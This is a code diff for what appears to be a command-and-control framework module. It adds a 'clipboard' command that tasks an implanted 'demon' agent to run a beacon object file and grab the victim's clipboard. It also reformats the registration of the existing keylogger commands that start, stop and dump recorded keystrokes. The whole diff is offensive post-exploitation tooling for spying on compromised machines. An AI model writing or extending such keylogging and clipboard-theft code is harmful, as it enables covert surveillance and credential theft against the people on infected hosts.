@@ -124,10 +124,30 @@ def dump(demon_id, *args):
 
     return task_id
 
+def clipboard(demon_id, *args):
+    packer: Packer = Packer()
+
+    # Get the agent instance based on demon ID
+    demon = Demon(demon_id)
+
+    # Check if enough arguments have been specified
+    if len(args) != 0:
+        demon.ConsoleWrite(demon.CONSOLE_ERROR, "this command does not take any argument")
+        return False
+
+    # Add the arguments to the packer
+    packer.addstr("clipboard")
+
+    task_id = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked the demon to execute the command")
+
+    demon.InlineExecute(task_id, "go", BOF_PATH, packer.getbuffer(), False)
+
+    return task_id
 
 RegisterModule("keylogger", "log typed keystrokes", "", "[command] (args)", "", "")
-RegisterCommand(start, "keylogger", "start", "start the keylogger", 0,"", "")
-RegisterCommand(stop, "keylogger", "stop", "stop the keylogger", 0,"", "")
-RegisterCommand(clear, "keylogger", "clear", "clear the recorded keystrokes", 0,"", "")
-RegisterCommand(info, "keylogger", "info", "print general information about the keylogger", 0,"", "")
-RegisterCommand(dump, "keylogger", "dump", "print recorded keystrokes", 0,"", "")
+RegisterCommand(start, "keylogger", "start", "start the keylogger", 0, "", "")
+RegisterCommand(stop, "keylogger", "stop", "stop the keylogger", 0, "", "")
+RegisterCommand(clear, "keylogger", "clear", "clear the recorded keystrokes", 0, "", "")
+RegisterCommand(info, "keylogger", "info", "print general information about the keylogger", 0, "", "")
+RegisterCommand(dump, "keylogger", "dump", "print recorded keystrokes", 0, "", "")
+RegisterCommand(clipboard, "keylogger", "clipboard", "get the content of the clipboard", 0, "", "")
